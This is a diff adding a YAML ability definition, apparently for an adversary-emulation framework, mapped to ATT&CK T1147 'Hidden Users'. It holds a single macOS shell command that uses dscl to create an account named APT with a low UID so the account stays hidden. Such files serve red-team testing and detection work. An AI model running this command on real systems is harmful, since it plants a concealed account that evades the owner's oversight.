@@ -1,0 +1,14 @@
+---
+
+- id: tacdefen-1147-AR00-1v00-200120190847
+  name: Hidden Users
+  description: .      Add a hidden user on MacOS.  
+  tactic: defense-evasion
+  technique:
+    attack_id: T1147
+    name: Hidden Users
+  platforms:
+    darwin:
+      sh:
+        command: |
+          sudo dscl . -create /Users/APT UniqueID 333
